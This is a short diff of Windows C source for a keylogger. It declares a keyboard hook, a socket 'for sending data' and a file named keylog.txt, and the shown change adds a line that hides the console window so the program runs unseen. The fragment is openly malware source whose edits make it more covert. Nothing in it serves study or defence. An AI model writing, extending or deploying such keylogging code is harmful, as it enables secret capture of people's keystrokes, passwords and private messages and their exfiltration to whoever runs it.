@@ -12,12 +12,13 @@
 // Function prototypes
 LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam);
 void send_key(unsigned char key);
-
 FILE *logFile; // File pointer for logging
 SOCKET sock;   // Socket for sending data
 
-int main() 
+int main()
 {
+    // Hide the console window
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
     logFile = fopen("keylog.txt", "a"); // Open log file in append mode
     if (!logFile)
     {
